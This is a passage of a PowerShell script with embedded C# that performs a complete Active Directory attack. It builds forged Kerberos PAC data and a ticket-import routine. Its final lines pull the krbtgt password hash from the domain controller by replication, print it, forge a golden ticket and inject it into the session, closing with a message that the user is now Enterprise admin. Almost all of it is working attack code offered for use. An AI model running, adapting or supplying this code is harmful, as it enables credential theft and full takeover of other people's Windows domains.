                Reserved = IntPtr.Zero;
                InterpreterInfo = IntPtr.Zero;
                Flags = 0u;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MIDL_STUB_DESC
        {
            public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
            public IntPtr pfnAllocate;
            public IntPtr pfnFree;
            public IntPtr pAutoBindHandle;
            public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
            public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
            public IntPtr /*EXPR_EVAL*/ apfnExprEval;
            public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
            public IntPtr pFormatTypes;
            public int fCheckBounds;
            /* Ndr library version. */
            public uint Version;
            public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
            public int MIDLVersion;
            public IntPtr CommFaultOffsets;
            // New fields for version 3.0+
            public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
            // Notify routines - added for NT5, MIDL 5.0
            public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
            public IntPtr mFlags;
            // International support routines - added for 64bit post NT5
            public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
            public IntPtr ProxyServerInfo;
            public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
            // Fields up to now present in win2000 release.

            public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                    IntPtr pfnAllocatePtr, IntPtr pfnFreePtr, IntPtr aGenericBindingRoutinePairsPtr)
            {
                pFormatTypes = pFormatTypesPtr;
                RpcInterfaceInformation = RpcInterfaceInformationPtr;
                CommFaultOffsets = IntPtr.Zero;
                pfnAllocate = pfnAllocatePtr;
                pfnFree = pfnFreePtr;
                pAutoBindHandle = IntPtr.Zero;
                apfnNdrRundownRoutines = IntPtr.Zero;
                aGenericBindingRoutinePairs = aGenericBindingRoutinePairsPtr;
                apfnExprEval = IntPtr.Zero;
                aXmitQuintuple = IntPtr.Zero;
                fCheckBounds = 1;
                Version = 0x50002u;
                pMallocFreeStruct = IntPtr.Zero;
                MIDLVersion = 0x8000253;
                aUserMarshalQuadruple = IntPtr.Zero;
                NotifyRoutineTable = IntPtr.Zero;
                mFlags = new IntPtr(0x00000001);
                CsRoutineTables = IntPtr.Zero;
                ProxyServerInfo = IntPtr.Zero;
                pExprInfo = IntPtr.Zero;
            }
        }

        delegate IntPtr allocmemory(int size);
        private static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        delegate void freememory(IntPtr memory);
        private static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }

        delegate void readFcn(IntPtr State, ref IntPtr pBuffer, ref int pSize);
        static void ReadFcn(IntPtr State, ref IntPtr pBuffer, ref int pSize)
        {
            KULL_M_RPC_FCNSTRUCT data = (KULL_M_RPC_FCNSTRUCT) Marshal.PtrToStructure(State, typeof(KULL_M_RPC_FCNSTRUCT));
            pBuffer = data.addr;
            data.addr = new IntPtr(pBuffer.ToInt64() + pSize);
            data.size = new IntPtr(data.size.ToInt64() - pSize);
            Marshal.StructureToPtr(data, State, true);
        }

        delegate void writeFcn(IntPtr State, IntPtr Buffer, int Size);
        static void WriteFcn(IntPtr State, IntPtr Buffer, int Size)
        {
	        
        }

        IntPtr AllocIntPtrFromSID(SecurityIdentifier sid)
        {
            IntPtr sidPtr = Marshal.AllocHGlobal(sid.BinaryLength);
            byte[] temp = new byte[sid.BinaryLength];
            sid.GetBinaryForm(temp, 0);
            Marshal.Copy(temp, 0, sidPtr, sid.BinaryLength);
            return sidPtr;
        }

        KERB_VALIDATION_INFO BuildValidationInfo()
        {
            KERB_VALIDATION_INFO validationInfo = new KERB_VALIDATION_INFO();
            
            
            validationInfo.LogonTime = TicketStart.ToFileTimeUtc();
            validationInfo.LogoffTime = long.MaxValue;
            validationInfo.KickOffTime = long.MaxValue;
            validationInfo.PasswordLastSet = long.MaxValue;
            validationInfo.PasswordCanChange = long.MaxValue;
            validationInfo.PasswordMustChange = long.MaxValue;
            validationInfo.LogonDomainName = new UNICODE_STRING(LogonDomainName);

            validationInfo.EffectiveName = new UNICODE_STRING(UserName);
            validationInfo.LogonDomainId = AllocIntPtrFromSID(DomainSid);
            validationInfo.UserId = UserId;
            validationInfo.UserAccountControl = USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
            if (Groups != null && Groups.Length > 0)
            {
                validationInfo.PrimaryGroupId = Groups[0];
                validationInfo.GroupCount = Groups.Length;
                validationInfo.GroupIds = Marshal.AllocHGlobal(8 * Groups.Length);
                for (int i = 0; i < Groups.Length; i++)
                {
                    Marshal.WriteInt32(validationInfo.GroupIds, 8 * i, Groups[i]);
                    Marshal.WriteInt32(validationInfo.GroupIds, 8 * i + 4, GroupAttributes[i]);
                }
            }
            if (ExtraSids != null && ExtraSids.Length > 0)
            {
                validationInfo.SidCount = ExtraSids.Length;
                validationInfo.UserFlags |= 0x20;

                int size = Marshal.SizeOf(typeof(KERB_SID_AND_ATTRIBUTES));
                validationInfo.ExtraSids = Marshal.AllocHGlobal(size * ExtraSids.Length);
                for(int i = 0; i < ExtraSids.Length; i++)
                {
                    KERB_SID_AND_ATTRIBUTES data = new KERB_SID_AND_ATTRIBUTES();
                    data.Sid = AllocIntPtrFromSID(ExtraSids[i]);
                    data.Attributes = ExtraSidAttributes[i];
                    Marshal.StructureToPtr(data, new IntPtr(validationInfo.ExtraSids.ToInt64() + size * i), true);
                }
            }

            validationInfo.UserSessionKey = new byte[16];

            //if (validationInfo.ResourceGroupDomainSid && validationInfo.ResourceGroupIds && validationInfo.ResourceGroupCount)
            //    validationInfo.UserFlags |= 0x200;
            return validationInfo;
        }

        void FreeValidationInfo(KERB_VALIDATION_INFO validationInfo)
        {
            if (validationInfo.LogonDomainId != IntPtr.Zero)
                Marshal.FreeHGlobal(validationInfo.GroupIds);
            if (validationInfo.GroupIds != IntPtr.Zero)
                Marshal.FreeHGlobal(validationInfo.LogonDomainId);
            if (validationInfo.ExtraSids != IntPtr.Zero)
            {
                int size = Marshal.SizeOf(typeof(KERB_SID_AND_ATTRIBUTES));
                for (int i = 0; i < validationInfo.SidCount; i++)
                {
                    KERB_SID_AND_ATTRIBUTES data = (KERB_SID_AND_ATTRIBUTES) Marshal.PtrToStructure(new IntPtr(validationInfo.ExtraSids.ToInt64() + size * i), typeof(KERB_SID_AND_ATTRIBUTES));
                    Marshal.FreeHGlobal(data.Sid);
                }
                Marshal.FreeHGlobal(validationInfo.ExtraSids);
            }
        }

        private byte[] ValidationInfoToLogonInfo()
        {
            
            int rpcStatus;
            KULL_M_RPC_FCNSTRUCT UserState = new KULL_M_RPC_FCNSTRUCT();
            IntPtr pHandle;
            int offset = (IntPtr.Size == 8 ? 346 : 556);
            byte[] MIDL_TypeFormatString = (IntPtr.Size == 8? MIDL_TypeFormatStringx64 : MIDL_TypeFormatStringx86);
            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(Guid.Empty, 1, 0);

            KERB_VALIDATION_INFO validationInfo = BuildValidationInfo();

            GCHandle clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            GCHandle formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);

            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                                clientinterface.AddrOfPinnedObject(),
                                                                Marshal.GetFunctionPointerForDelegate((allocmemory)AllocateMemory),
                                                                Marshal.GetFunctionPointerForDelegate((freememory)FreeMemory),
                                                                IntPtr.Zero);
            
            IntPtr pObject = Marshal.AllocHGlobal(Marshal.SizeOf(validationInfo));
            Marshal.StructureToPtr(validationInfo, pObject, false);
            
            GCHandle stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            IntPtr buffer = IntPtr.Zero;
            IntPtr UserStateBuffer = IntPtr.Zero;
            try
            {
                UserStateBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(UserState));

                IntPtr readptr = Marshal.GetFunctionPointerForDelegate((readFcn)ReadFcn);
                IntPtr writeptr = Marshal.GetFunctionPointerForDelegate((writeFcn)WriteFcn);
                rpcStatus = MesEncodeIncrementalHandleCreate(UserStateBuffer, readptr, writeptr, out pHandle);
                if (rpcStatus != 0)
                    throw new Win32Exception(rpcStatus);


                IntPtr size = NdrMesTypeAlignSize2(pHandle, ref PicklingInfo, stub.AddrOfPinnedObject(), Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_TypeFormatString, offset), ref pObject);

                buffer = Marshal.AllocHGlobal(size);
                UserState.addr = buffer;
                UserState.size = size;
                Marshal.StructureToPtr(UserState, UserStateBuffer, true);

                rpcStatus = MesIncrementalHandleReset(pHandle, UserStateBuffer, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0);
                if (rpcStatus != 0)
                    throw new Win32Exception(rpcStatus);

                NdrMesTypeEncode2(pHandle, ref PicklingInfo, stub.AddrOfPinnedObject(), Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_TypeFormatString, offset), ref pObject);

                MesHandleFree(pHandle);
                byte[] output = new byte[size.ToInt64()];
                Marshal.Copy(buffer, output, 0, output.Length);
                return output;
            }
            catch (SEHException ex)
            {
                throw new Win32Exception(ex.ErrorCode);
            }
            finally
            {
                clientinterface.Free();
                stub.Free();
                formatString.Free();
                Marshal.FreeHGlobal(pObject);
                if (buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(buffer);
                if (UserStateBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(UserStateBuffer);
                FreeValidationInfo(validationInfo);
            }
        }


    }
}
"@

$sourceExportTgt = @"
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace kerberos
{
    public class TGTImporter
    {
        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaConnectUntrusted([Out] out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaDeregisterLogonProcess([In] IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaLookupAuthenticationPackage([In] IntPtr LsaHandle, [In] ref LSA_STRING PackageName, [Out] out int AuthenticationPackage);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, int AuthenticationPackage, IntPtr ProtocolSubmitBuffer, int SubmitBufferLength, out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength, out int ProtocolStatus);


        [DllImport("advapi32.dll", SetLastError = false)]
        private static extern int LsaNtStatusToWinError(int StatusCode);

        private enum KERB_PROTOCOL_MESSAGE_TYPE : uint
        {
            KerbSubmitTicketMessage = 21,
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public String Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_CRYPTO_KEY32
        {
            public int KeyType;
            public int Length;
            public int Offset;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID {
            int LowPart;
            int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_SUBMIT_TKT_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
            public int Flags;
            public KERB_CRYPTO_KEY32 Key; // key to decrypt KERB_CRED
            public int KerbCredSize;
            public int KerbCredOffset;
        }

        public static void ImportTGT(byte[] ticket)
        {
            IntPtr LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;
            
            ntstatus = LsaConnectUntrusted(out LsaHandle);
            if (ntstatus != 0)
                throw new Win32Exception(LsaNtStatusToWinError(ntstatus));
            IntPtr inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                LSA_STRING LSAString;
                string Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;

                ntstatus = LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                    throw new Win32Exception(LsaNtStatusToWinError(ntstatus));

                KERB_SUBMIT_TKT_REQUEST request = new KERB_SUBMIT_TKT_REQUEST();
                request.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                request.KerbCredSize = ticket.Length;
                request.KerbCredOffset = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST));
            
                int inputBufferSize = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);

                ntstatus = LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                    throw new Win32Exception(LsaNtStatusToWinError(ntstatus));
                if (ProtocalStatus != 0)
                    throw new Win32Exception(LsaNtStatusToWinError(ProtocalStatus));
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                LsaDeregisterLogonProcess(LsaHandle);
            }
        }
    }
}
"@

Add-Type -TypeDefinition $sourceDrsr

$drsr =  New-Object  drsrdotnet.drsr
$rootdse = ([ADSI]”LDAP://RootDSE”)
$drsr.Initialize($rootdse.dnshostname, $env:USERDNSDOMAIN)
$values = $drsr.GetData("krbtgt")
$krbtgt = $values["ATT_UNICODE_PWD"]

Write-Host "krbtgt hash"
-join ($krbtgt|  foreach {$_.ToString("X2") } )

Add-Type -TypeDefinition $sourceGolden

Add-Type -AssemblyName System.DirectoryServices.AccountManagement            
$domainSid = ([System.DirectoryServices.AccountManagement.UserPrincipal]::Current).SID.AccountDomainSid
$domainName = ([System.DirectoryServices.AccountManagement.UserPrincipal]::Current).Name
$factory =  New-Object  drsrdotnet.GoldenTicketFactory($domainName, $env:USERDNSDOMAIN, $domainSid, $krbtgt);
$ticket = $factory.CreateGoldenTicket()

Write-Host "golden ticket"
-join ($ticket|  foreach {$_.ToString("X2") } )

Add-Type -TypeDefinition $sourceExportTgt

[kerberos.TGTImporter]::ImportTGT($ticket)

Write-Host "Ticket imported"
Write-Host "======================================================================"
Write-Host "You got promoted Enterprise admin (when connecting to other computers)"
Write-Host "Have a nice day"